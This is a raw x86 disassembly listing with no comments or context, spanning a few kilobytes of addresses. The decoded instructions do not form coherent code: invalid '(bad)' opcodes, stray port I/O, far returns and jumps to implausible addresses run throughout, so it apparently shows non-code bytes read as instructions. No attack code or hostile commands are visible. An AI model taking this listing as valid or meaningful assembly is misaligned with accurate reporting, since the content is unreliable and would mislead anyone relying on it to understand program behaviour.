  432d90:	add    BYTE PTR [ebp+0x66],dl
  432d93:	add    eax,ebx
  432d95:	add    esp,eax
  432d97:	sub    eax,eax
  432d99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d9f:	add    BYTE PTR [eax],al
  432da1:	mov    DWORD PTR [ebx-0x24],ebx
  432da4:	push   edi
  432da5:	push   ebp
  432da6:	clc    
  432da7:	add    DWORD PTR [esi+0x1b0100],0x45
  432dae:	out    0xff,eax
  432db0:	add    edx,DWORD PTR [eax]
  432db2:	jmp    0x432d9c
  432db4:	cmp    ch,0x46
  432db7:	(bad)  
  432db8:	jmp    0x40c8b60a
  432dbd:	je     0x432d49
  432dbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dc5:	inc    ebp
  432dc6:	add    BYTE PTR [ebx-0x770375],al
  432dcc:	add    ah,ch
  432dce:	add    edx,esp
  432dd0:	pop    edi
  432dd1:	pop    ebp
  432dd2:	push   ebp
  432dd3:	inc    ebx
  432dd4:	in     al,dx
  432dd5:	pop    ebp
  432dd6:	in     al,dx
  432dd7:	cmp    edx,DWORD PTR [edi-0x8]
  432dda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432de1:	add    al,0x47
  432de3:	push   ebp
  432de4:	mov    esp,ebp
  432de6:	in     al,0x45
  432de8:	dec    ebp
  432de9:	push   esi
  432dea:	test   DWORD PTR [eax+0xfb010f],esi
  432df0:	add    BYTE PTR [eax+0xc018b],dh
  432df6:	leave  
  432df7:	inc    ebp
  432df8:	test   al,ch
  432dfa:	add    dh,bh
  432dfc:	add    bh,bh
  432dfe:	dec    ebp
  432dff:	push   cs
  432e00:	mov    DWORD PTR [ecx],eax
  432e02:	hlt    
  432e03:	push   es
  432e04:	dec    ebp
  432e05:	leave  
  432e06:	mov    DWORD PTR [eax],ecx
  432e08:	clc    
  432e09:	cmovge eax,ecx
  432e0c:	mov    ecx,0x85c2f0
  432e12:	clc    
  432e13:	pop    DWORD PTR [ebp+0x1]
  432e16:	push   ebx
  432e17:	add    BYTE PTR [ebp-0x15],bh
  432e1a:	push   esi
  432e1b:	xor    eax,0x898a45
  432e20:	cld    
  432e21:	add    al,BYTE PTR [ebp+0x0]
  432e24:	xor    esp,DWORD PTR [esi-0x64]
  432e27:	add    DWORD PTR [esi+0x78308c1],edi
  432e2d:	add    ah,BYTE PTR [ebp-0x49]
  432e30:	int    0xbb
  432e32:	mov    ecx,DWORD PTR [esi+0xc]
  432e35:	add    dh,al
  432e37:	cmp    ecx,ebx
  432e39:	jne    0x432e03
  432e3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432e3e:	jmp    0xca2e44
  432e43:	add    DWORD PTR [ebp+0x0],eax
  432e46:	mov    eax,ebx
  432e48:	or     al,0x8b
  432e4a:	(bad)  
  432e4b:	mov    ecx,esi
  432e4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e54:	mov    eax,edi
  432e56:	or     BYTE PTR [edx],cl
  432e58:	shl    cl,cl
  432e5a:	icebp  
  432e5b:	add    BYTE PTR [ebp+0x38],0x8b
  432e5f:	or     BYTE PTR [edx+eax*2],cl
  432e62:	(bad)  
  432e63:	or     cl,dh
  432e65:	stc    
  432e66:	shl    DWORD PTR [ebp-0x30],0xc6
  432e6a:	xor    al,0x0
  432e6c:	inc    ebp
  432e6d:	xchg   BYTE PTR [ebx],al
  432e6f:	add    esp,edi
  432e71:	add    BYTE PTR [ebp-0x39],cl
  432e74:	mov    al,bl
  432e76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e7c:	sub    al,0xbf
  432e7e:	jmp    0x432e05
  432e80:	mov    edi,eax
  432e82:	lock jge 0x432e76
  432e85:	lea    esi,[edx-0x74bad5ff]
  432e8b:	mov    ebp,esp
  432e8d:	or     cl,dh
  432e8f:	leave  
  432e90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e97:	dec    ebp
  432e98:	dec    ebp
  432e99:	test   DWORD PTR [ebx],eax
  432e9b:	paddb  mm6,mm0
  432e9e:	add    DWORD PTR [eax],eax
  432ea0:	dec    ebp
  432ea1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ea7:	mov    esi,DWORD PTR [edx]
  432ea9:	or     al,0x2b
  432eab:	dec    ebp
  432eac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432eb2:	mov    esp,edi
  432eb4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ebb:	mov    DWORD PTR [ebx],ebp
  432ebd:	call   0xc76b7ed
  432ec2:	mov    DWORD PTR [ebp+0x10],ecx
  432ec5:	(bad)  
  432ec6:	push   0x8b85ff10
  432ecb:	clc    
  432ecc:	or     al,0x54
  432ece:	(bad)  
  432ecf:	push   ecx
  432ed0:	retf   
  432ed1:	mov    ebx,0xff4d8dc8
  432ed6:	mov    DWORD PTR [ebp+0x8],eax
  432ed9:	xor    eax,DWORD PTR [ebp-0x75]
  432edc:	cmp    ebp,DWORD PTR [ebx]
  432ede:	lsl    ebx,WORD PTR [edi-0x8]
  432ee2:	call   DWORD PTR [ebx-0x741bff75]
  432ee8:	(bad)  
  432ee9:	or     al,0x5b
  432eeb:	dec    ebp
  432eec:	or     BYTE PTR [ebx],dh
  432eee:	inc    ebp
  432eef:	xor    esi,DWORD PTR ds:0x708088d
  432ef5:	in     eax,0x9b
  432ef7:	add    BYTE PTR [edx],dh
  432ef9:	inc    ebp
  432efa:	pop    edi
  432efb:	xor    eax,edx
  432efd:	test   DWORD PTR [eax],0x81108b8b
  432f03:	dec    ebp
  432f04:	sub    al,0x33
  432f06:	add    BYTE PTR [ebx],dh
  432f08:	push   esi
  432f09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f0f:	mov    edi,eax
  432f11:	or     BYTE PTR [ebp+0x45],al
  432f14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f1a:	xor    ecx,ecx
  432f1c:	pushf  
  432f1d:	push   es
  432f1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f25:	dec    ebp
  432f26:	inc    ebp
  432f27:	cmp    BYTE PTR [ecx],0x54
  432f2a:	pushf  
  432f2b:	gs (bad) 
  432f2d:	shl    esp,1
  432f2f:	dec    ebp
  432f30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f36:	shr    ecx,1
  432f38:	xlat   BYTE PTR ds:[ebx]
  432f39:	rol    bh,cl
  432f3b:	mov    edx,esp
  432f3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432f43:	mov    ecx,DWORD PTR [eax]
  432f45:	or     BYTE PTR [eax],al
  432f47:	push   ebp
  432f48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f4e:	dec    ebp
  432f4f:	enter  0xceba,0x8
  432f53:	retf   0x1807
  432f56:	ret    0x9b4d
  432f59:	mov    esi,DWORD PTR [edx]
  432f5b:	or     al,0x33
  432f5d:	into   
  432f5e:	add    edx,esi
  432f60:	add    ecx,edx
  432f62:	bswap  eax
  432f64:	ror    esi,0x98
  432f67:	dec    ebp
  432f68:	add    cl,ch
  432f6a:	mov    edi,edi
  432f6c:	hlt    
  432f6d:	inc    esi
  432f6f:	inc    ebp
  432f70:	ret    0x4533
  432f73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f79:	or     BYTE PTR [ebx],dh
  432f7b:	dec    ebp
  432f7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f82:	jne    0xff8d2f49
  432f88:	inc    ebp
  432f89:	inc    ebp
  432f8a:	mov    esi,DWORD PTR [ebx]
  432f8c:	clc    
  432f8d:	pop    esi
  432f8e:	ret    0xcaeb
  432f91:	mov    eax,esi
  432f93:	call   0x52048466
  432f98:	dec    ebp
  432f99:	add    eax,0xf8728b
  432f9e:	adc    eax,0xce0ccac9
  432fa3:	push   ebp
  432fa4:	ret    0xc6ec
  432fa7:	in     al,dx
  432fa8:	call   0x33437cb1
  432fad:	push   edi
  432fae:	add    edi,eax
  432fb0:	xor    eax,eax
  432fb2:	jmp    0x432ff9
  432fb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fba:	add    eax,edi
  432fbc:	shr    eax,cl
  432fbe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fc4:	mov    esi,DWORD PTR [edx]
  432fc6:	in     al,dx
  432fc7:	pushf  
  432fc8:	ret    0x84c7
  432fcb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fd1:	inc    ebp
  432fd2:	in     al,dx
  432fd3:	xor    DWORD PTR [ebp-0x64],eax
  432fd6:	mov    eax,edi
  432fd8:	cld    
  432fd9:	fmul   st(2),st
  432fdb:	sbb    dl,al
  432fdd:	jmp    0x9c3b:0x304d45c1
  432fe4:	jbe    0x432fad
  432fe6:	mov    esp,eax
  432fe8:	clc    
  432fe9:	add    BYTE PTR [ebp+0x0],cl
  432fec:	mov    ecx,ecx
  432fee:	lea    eax,[ebp-0x5]
  432ff1:	mov    edi,edi
  432ff3:	call   0x51ce843d
  432ff8:	hlt    
  432ff9:	xor    eax,edx
  432ffb:	mov    esi,0x9b7284
  433000:	xor    cl,dl
  433002:	mov    esi,eax
  433004:	hlt    
  433005:	into   
  433006:	inc    ebp
  433007:	scas   eax,DWORD PTR es:[edi]
  433008:	mov    ebp,ecx
  43300a:	cld    
  43300b:	add    dl,cl
  43300d:	add    dl,al
  43300f:	inc    ebp
  433010:	shr    DWORD PTR [ebx],0x4d
  433013:	xor    edi,DWORD PTR [ebx]
  433015:	mov    DWORD PTR [edi],ecx
  433017:	clc    
  433018:	dec    esi
  433019:	inc    ebp
  43301a:	dec    DWORD PTR [ebx-0x3d2b1775]
  433020:	ret    0xc6ca
  433023:	mov    BYTE PTR [ebp-0x32],0x53
  433027:	scas   eax,DWORD PTR es:[edi]
  433028:	inc    ebp
  433029:	jmp    0x43305b
  43302b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433032:	pop    ebx
  433033:	xor    ecx,DWORD PTR [ebp+0x3]
  433036:	mov    eax,DWORD PTR [ebx]
  433038:	clc    
  433039:	test   edx,ecx
  43303b:	mov    ecx,esi
  43303d:	cld    
  43303e:	call   0x8ab77588
  433043:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433049:	add    ecx,DWORD PTR [ebx-0x4974072d]
  43304f:	fdiv   QWORD PTR [ebx]
  433051:	retf   0xce89
  433054:	in     al,0xc1
  433056:	inc    ebp
  433057:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  43305d:	into   
  43305e:	mov    dh,0xc1
  433061:	call   0x8c1775ea
  433066:	(bad)  
  433067:	cld    
  433068:	mov    ecx,DWORD PTR [ebp-0x14]
  43306b:	xor    eax,ecx
  43306d:	lea    eax,[ebp+0x8]
  433070:	mov    esi,DWORD PTR [edx-0x4]
  433073:	add    dl,al
  433075:	inc    ebp
  433076:	mov    esp,0x32d89b8b
  43307b:	dec    ebp
  43307c:	mov    esi,DWORD PTR [ebx]
  43307e:	cld    
  43307f:	xor    eax,edx
  433081:	sub    esp,DWORD PTR [ebp-0x75]
  433084:	int    0xec
  433086:	sub    ecx,eax
  433088:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43308e:	mov    esi,esp
  433090:	call   0x34177e19
  433095:	inc    DWORD PTR [ebx]
  433097:	mov    edi,DWORD PTR [ebx]
  433099:	cld    
  43309a:	jne    0x4330e9
  43309c:	mov    esi,DWORD PTR [ebx]
  43309e:	aam    0x8d
  4330a0:	dec    ebp
  4330a1:	or     BYTE PTR [ebx],dh
  4330a3:	jb     0x4330a8
  4330a5:	add    BYTE PTR [edi+0x45],bl
  4330a8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330af:	xor    ebp,esp
  4330b1:	xor    eax,edi
  4330b3:	sub    edi,esp
  4330b5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330bb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330c2:	inc    ebp
  4330c3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330c9:	clc    
  4330ca:	mov    eax,edi
  4330cc:	nop
  4330cd:	fadd   QWORD PTR [eax]
  4330cf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330d5:	jmp    0x433060
  4330d7:	mov    eax,DWORD PTR [ecx]
  4330d9:	fadd   DWORD PTR [eax]
  4330db:	inc    ebp
  4330dc:	or     DWORD PTR [ebx],esi
  4330de:	dec    eax
  4330df:	add    edx,DWORD PTR [ebx-0x2d]
  4330e2:	dec    ebp
  4330e3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330e9:	inc    ebp
  4330ea:	push   esp
  4330eb:	mov    dl,BYTE PTR [ecx-0xd]
  4330ee:	xor    ecx,DWORD PTR [ebp-0x45]
  4330f1:	(bad)  
  4330f3:	rol    BYTE PTR [eax],0xc1
  4330f6:	ret    
  4330f7:	inc    ebp
  4330f8:	inc    ebp
  4330f9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  4330ff:	xor    eax,ebx
  433101:	add    eax,DWORD PTR [ebp+0x23]
  433104:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43310a:	cmp    edi,0xc
  43310d:	dec    ebp
  43310e:	inc    ebp
  43310f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433115:	inc    ebp
  433116:	mov    esi,DWORD PTR [ebx]
  433118:	clc    
  433119:	lea    eax,[ebp+0x45725407]
  43311f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433123:	xor    edi,DWORD PTR [eax]
  433125:	mov    ecx,0xff8b8d4d
  43312a:	push   esp
  43312b:	enter  0x4df7,0x23
  43312f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433135:	mov    eax,DWORD PTR [ebx]
  433137:	loopne 0x433124
  433139:	ret    0xc68b
  43313c:	push   esp
  43313d:	enter  0x9745,0x8b
  433141:	inc    ebp
  433142:	cld    
  433143:	mov    eax,edi
  433145:	clc    
  433146:	ret    
  433147:	ret    0xc645
  43314a:	mov    esi,DWORD PTR [ebx]
  43314c:	cld    
  43314d:	pop    esi
  43314e:	mov    ebx,0x83458bc3
  433154:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433158:	dec    ebp
  433159:	xor    DWORD PTR [ebx],esi
  43315b:	pushf  
  43315c:	add    edi,DWORD PTR [edx-0x7767a77]
  433162:	fcom   DWORD PTR [ebp+0x45]
  433165:	mov    esi,DWORD PTR [ebx]
  433167:	adc    al,0x9c
  433169:	inc    ebp
  43316a:	(bad)  
  43316b:	mov    ebx,eax
  43316d:	adc    al,0x85
  43316f:	cmp    al,0x1
  433172:	inc    ebp
  433173:	add    BYTE PTR ds:0xe98b9c4d,bh
  433179:	mov    eax,DWORD PTR [ebx]
  43317b:	nop
  43317c:	add    BYTE PTR [eax],al
  43317e:	inc    ebp
  43317f:	mov    esi,DWORD PTR [ebx]
  433181:	add    eax,DWORD PTR [ebx]
  433183:	cmp    al,0x89
  433185:	mov    esp,esi
  433187:	clc    
  433188:	inc    ebp
  433189:	inc    ebp
  43318a:	add    edx,DWORD PTR [esi+0xc]
  43318d:	mov    edi,0x7ff0845
  433192:	in     al,dx
  433193:	(bad)  
  433194:	jne    0x433131
  433196:	mov    esi,DWORD PTR [edx]
  433198:	clc    
  433199:	add    ebp,DWORD PTR [esi]
  43319b:	mov    edi,edi
  43319d:	in     al,dx
  43319e:	mov    DWORD PTR [ebp-0x10],eax
  4331a1:	xor    eax,DWORD PTR [ebp+0x3]
  4331a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4331b0:	lea    ecx,[ecx+0x45e8d4bc]
  4331b6:	clc    
  4331b7:	mov    edi,edi
  4331b9:	cmp    BYTE PTR [ebp+0x4d],al
  4331bc:	test   DWORD PTR [eax+0x74],ecx
  4331bf:	inc    ecx
  4331c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331c6:	ret    
  4331c7:	inc    eax
  4331c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331ce:	push   eax
  4331cf:	dec    eax
  4331d0:	test   al,0xd0
  4331d2:	dec    eax
  4331d4:	mov    eax,DWORD PTR [ebp-0x14]
  4331d7:	mov    eax,DWORD PTR [ebp+0x38]
  4331da:	mov    eax,ecx
  4331dc:	fadd   DWORD PTR [ebx]
  4331de:	dec    ebp
  4331df:	inc    eax
  4331e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331e6:	inc    ebp
  4331e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4331ed:	fadd   QWORD PTR [ebx]
  4331ef:	inc    ebp
  4331f0:	or     al,0x33
  4331f2:	dec    ebp
  4331f3:	add    edi,DWORD PTR [ebx]
  4331f5:	mov    DWORD PTR [edx-0x28],esi
  4331f8:	mov    eax,DWORD PTR [ebp-0x10]
  4331fb:	mov    eax,DWORD PTR [eax+0x10]
  4331fe:	mov    eax,edi
  433200:	lock ret 
  433202:	inc    ecx
  433203:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433209:	fsubr  st,st(5)
  43320b:	test   DWORD PTR [eax],eax
  43320d:	clc    
  43320e:	push   0x45
  433210:	(bad)  
  433211:	cmp    al,0xec
  433213:	pushf  
  433214:	inc    ebp
  433215:	(bad)  
  433216:	push   eax
  433217:	fsub   DWORD PTR [eax-0x7b]
  43321a:	(bad)  
  43321b:	clc    
  43321c:	mov    eax,0xf8008584
  433221:	mov    eax,DWORD PTR [ebp-0x4]
  433224:	mov    edi,0x4585c3cc
  43322a:	clc    
  43322b:	mov    eax,DWORD PTR [ebp+0x14]
  43322e:	xor    eax,DWORD PTR [ebp-0x64]
  433231:	mov    edi,eax
  433233:	in     al,dx
  433234:	les    esi,FWORD PTR [ebp-0x7b]
  433237:	mov    edi,eax
  433239:	or     al,0x4d
  43323b:	dec    ebp
  43323c:	mov    eax,ebp
  43323e:	in     al,0xf2
  433240:	dec    ebp
  433241:	dec    DWORD PTR [ecx+0x4dc7e045]
  433247:	fmul   DWORD PTR [ecx+0x4df8f085]
  43324d:	inc    ebp
  43324e:	mov    DWORD PTR [ebx],esi
  433250:	fadd   QWORD PTR [ebx]
  433252:	dec    ebp
  433253:	push   eax
  433254:	xor    eax,DWORD PTR [ebp+0x3]
  433257:	push   eax
  433258:	mov    DWORD PTR [eax+ebx*8],ebx
  43325b:	push   esi
  43325d:	mov    eax,DWORD PTR [eax]
  43325f:	lock cmp eax,0xf84e85c0
  433265:	inc    ebp
  433266:	test   BYTE PTR [ebx],dh
  433268:	add    DWORD PTR [ebx],eax
  43326a:	add    BYTE PTR [eax+0x4d],dl
  43326d:	jne    0x4332a2
  43326f:	lea    ecx,[ebx-0x7617fc44]
  433275:	div    ah
  433277:	inc    DWORD PTR [ebp+0x45]
  43327a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433280:	jb     0x43320d
  433282:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433289:	mov    ecx,DWORD PTR [ebp-0x10]
  43328c:	xor    ecx,DWORD PTR [ebp+0x3]
  43328f:	mov    edi,DWORD PTR [ebx]
  433291:	adc    BYTE PTR [ebp+0x41],dh
  433294:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43329a:	ret    
  43329b:	push   ss
  43329c:	push   0x45
  43329e:	lea    ecx,[ebx+0x4de80cb0]
  4332a4:	sti    
  4332a5:	add    edi,edi
  4332a7:	or     BYTE PTR [ebp+0x4d],al
  4332aa:	mov    ebp,DWORD PTR [ebx]
  4332ac:	xor    ebp,ecx
  4332ae:	mov    al,BYTE PTR [edx]
  4332b0:	add    eax,0xc7200
  4332b5:	jne    0x433304
  4332b7:	lea    esi,[ebx]
  4332b9:	mov    al,0xf
  4332bb:	call   0xf2980
  4332c0:	shl    DWORD PTR [ecx],0x84
  4332c3:	pushf  
  4332c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332ca:	mov    esi,DWORD PTR [edx]
  4332cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332d3:	test   DWORD PTR [eax],eax
  4332d5:	clc    
  4332d6:	dec    ebp
  4332d7:	inc    ebp
  4332d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4332db:	pushf  
  4332dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332e3:	lea    eax,[ecx]
  4332e5:	int3   
  4332e6:	add    BYTE PTR [ebp+0x45],cl
  4332e9:	lea    ecx,[ebx-0x75b2cc38]
  4332ef:	lea    eax,ds:0x4d72c4
  4332f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4332f8:	xor    ecx,edi
  4332fa:	bswap  ebx
  4332fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433300:	rol    DWORD PTR [ecx],0x84
  433303:	add    BYTE PTR [ecx],al
  433305:	xor    eax,DWORD PTR [eax]
  433307:	pushf  
  433308:	inc    ebp
  433309:	jnp    0x8a43670c
  43330f:	mov    eax,DWORD PTR ds:0xcf72e8
  433315:	lock dec ebp
  433317:	retf   
  433318:	xor    ecx,DWORD PTR [ebp+0xf]
  43331b:	mov    eax,eax
  43331d:	fmul   st,st(3)
  43331f:	test   ecx,0x19b8484
  433325:	xor    al,BYTE PTR [eax]
  433327:	mov    DWORD PTR [ebp-0x28],eax
  43332a:	mov    eax,DWORD PTR [ebp+0x33]
  43332d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433333:	ret    
  433334:	add    al,cl
  433336:	dec    ebp
  433337:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43333d:	add    ecx,DWORD PTR ds:0xc7250
  433343:	inc    ebp
  433344:	rcl    DWORD PTR [eax+0x4d],0x2b
  433348:	mov    edi,edi
  43334a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433350:	jb     0x433319
  433352:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433359:	mov    esi,DWORD PTR [ebx]
  43335b:	cld    
  43335c:	mov    cl,bh
  43335e:	or     eax,0x372b6
  433363:	cmp    ecx,eax
  433365:	jne    0x4333e2
  43336b:	mov    eax,DWORD PTR [ebp-0x20]
  43336e:	mov    eax,DWORD PTR [eax]
  433370:	xor    eax,edi
  433372:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433379:	mov    ecx,DWORD PTR [ebp-0x4]
  43337c:	mov    ecx,edi
  43337e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433384:	jb     0x433395
  433386:	add    BYTE PTR [edi-0x3f],dl
  433389:	add    BYTE PTR [ebp-0x75],cl
  43338c:	mov    esi,eax
  43338e:	xor    eax,DWORD PTR [eax]
  433390:	mov    al,bh
  433392:	or     eax,0x4b7284
  433397:	xor    al,cl
  433399:	mov    ecx,DWORD PTR [ebp-0x4]
  43339c:	mov    ecx,edi
  43339e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333a4:	jb     0x4333b5
  4333a6:	add    BYTE PTR [edi],dh
  4333a8:	enter  0x8500,0x8b
  4333ac:	add    ah,bl
  4333ae:	add    BYTE PTR [eax],al
  4333b0:	inc    ebp
  4333b1:	(bad)  
  4333b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333b9:	mov    esi,DWORD PTR [edx-0x4]
  4333bc:	add    bh,cl
  4333be:	dec    ebp
  4333bf:	mov    dh,0x8b
  4333c1:	add    esi,DWORD PTR [ebx]
  4333c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333c9:	add    BYTE PTR [eax],al
  4333cb:	mov    eax,ecx
  4333cd:	loopne 0x43341c
  4333cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333d5:	dec    ebx
  4333d6:	or     eax,0x8b7232
  4333db:	in     al,0xc1
  4333dd:	or     DWORD PTR [ebp-0x31],ecx
  4333e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333e7:	xor    dh,BYTE PTR [edx-0x75]
  4333ea:	add    al,dh
  4333ec:	enter  0x4f09,0xcf
  4333f0:	inc    ebp
  4333f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4333f7:	or     al,BYTE PTR ds:0xe4728b
  4333fd:	or     DWORD PTR [ebp-0x31],ecx
  433400:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433407:	cmp    dh,BYTE PTR [edx+0xf]
  43340a:	add    bl,dl
  43340c:	rol    DWORD PTR [eax],0x4d
  43340f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433415:	(bad)  
  433416:	or     eax,0x4b7284
  43341b:	xor    al,cl
  43341d:	mov    ecx,DWORD PTR [ebp-0x20]
  433420:	mov    ecx,DWORD PTR [ecx]
  433422:	xor    ecx,edi
  433424:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43342b:	xor    cl,al
  43342d:	mov    ecx,DWORD PTR [edi]
  43342f:	fadd   QWORD PTR [ebp+0x9]
  433432:	call   0xffd02f06
  433437:	dec    ebx
  433438:	dec    ebp
  433439:	xor    bh,BYTE PTR [ebx]
  43343b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43343f:	loopne 0x43343d
  433441:	or     edi,eax
  433443:	iret   
  433444:	ret    
  433445:	mov    WORD PTR [ebp+0x4f],es
  433448:	mov    esi,DWORD PTR [edx]
  43344a:	call   0x8452fb89
  43344f:	(bad)  
  433450:	fwait
  433451:	add    BYTE PTR [edx],dh
  433453:	mov    esi,DWORD PTR [ebx]
  433455:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43345b:	test   BYTE PTR [ebx],dh
  43345d:	dec    ebx
  43345e:	add    esi,DWORD PTR [edx]
  433460:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433466:	dec    edi
  433468:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43346f:	xor    al,BYTE PTR [ebx]
  433471:	mov    edi,DWORD PTR [ebx]
  433473:	in     al,0x75
  433475:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43347b:	dec    ebx
  43347c:	xor    esi,DWORD PTR [edx]
  43347e:	lea    ecx,[edx]
  433480:	or     BYTE PTR [ebx+0x900f072],cl
  433486:	ja     0x433457
  433488:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43348f:	cmp    ch,al
  433491:	jne    0x433486
  433493:	mov    edi,edi
  433495:	fadd   QWORD PTR [ebp+0x0]
  433498:	mov    eax,edi
  43349a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334a1:	mov    edx,DWORD PTR [ebx]
  4334a3:	in     al,0x45
  4334a5:	or     DWORD PTR [ebx],esi
  4334a7:	iret   
  4334a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334af:	xor    dl,BYTE PTR [eax-0x75]
  4334b2:	sbb    al,0xe0
  4334b4:	dec    DWORD PTR [ecx]
  4334b6:	mov    ecx,edi
  4334b8:	in     al,dx
  4334b9:	mov    eax,es
  4334bb:	dec    ebx
  4334bc:	mov    DWORD PTR [edx],esi
  4334be:	fmul   QWORD PTR [edx]
  4334c0:	jne    0x43344d
  4334c2:	(bad)  
  4334c3:	(bad)  
  4334c5:	or     DWORD PTR [ebp-0x31],eax
  4334c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334cf:	cmp    bh,bh
  4334d1:	jne    0x433518
  4334d3:	lea    ecx,[ebx-0x38372750]
  4334d9:	inc    ebx
  4334db:	mov    eax,ecx
  4334dd:	mov    eax,0xa00c111
  4334e2:	jne    0x433529
  4334e4:	mov    esi,DWORD PTR [ebx]
  4334e6:	test   al,0x3
  4334e8:	inc    ebp
  4334e9:	mov    DWORD PTR [eax-0xc],edx
  4334ec:	loop   0x433533
  4334ee:	push   DWORD PTR [ebx]
  4334f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4334f6:	add    DWORD PTR [eax],eax
  4334f8:	mov    eax,edi
  4334fa:	lods   al,BYTE PTR ds:[esi]
  4334fb:	dec    ebp
  4334fc:	inc    ebp
  4334fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433503:	retf   
  433504:	mov    edx,ecx
  433506:	adc    al,0x84
  433508:	(bad)  
  433509:	std    
  43350a:	ret    
  43350b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433511:	hlt    
  433512:	rol    edi,0x82
  433515:	ret    
  433516:	cld    
  433517:	enter  0x11ff,0x45
  43351b:	inc    ebp
  43351c:	pop    edi
  43351d:	mov    ebx,DWORD PTR [ebx+0x14]
  433520:	ret    0xc7
  433523:	test   BYTE PTR [ebx+0x4532519b],cl
  433529:	jmp    0x4334b6
  43352b:	push   0x8
  43352d:	call   DWORD PTR [esi]
  43352f:	in     al,dx
  433530:	add    BYTE PTR [ebp+0x1],0x50
  433534:	add    bh,ah
  433536:	add    bh,bh
  433538:	icebp  
  433539:	mov    ecx,DWORD PTR [eax]
  43353b:	cld    
  43353c:	pop    es
  43353d:	dec    ebp
  43353e:	shl    DWORD PTR [ebx],0x72
  433541:	add    eax,DWORD PTR [eax]
  433543:	cmp    edx,ecx
  433545:	je     0x433557
  433547:	mov    esi,DWORD PTR [ebp-0x4]
  43354a:	inc    edi
  43354c:	or     al,0xc3
  43354e:	jmp    FWORD PTR [edx-0x18]
  433551:	(bad)  
  433552:	sti    
  433553:	cwde   
  433554:	(bad)  
  433555:	call   0xffa12e60
  43355a:	or     al,0x45
  43355c:	push   ebp
  43355d:	sub    esp,0x18
  433560:	push   ebx
  433561:	inc    ebp
  433562:	mov    edi,edi
  433564:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43356b:	test   al,0x54
  43356d:	inc    ebp
  43356e:	push   ecx
  43356f:	push   eax
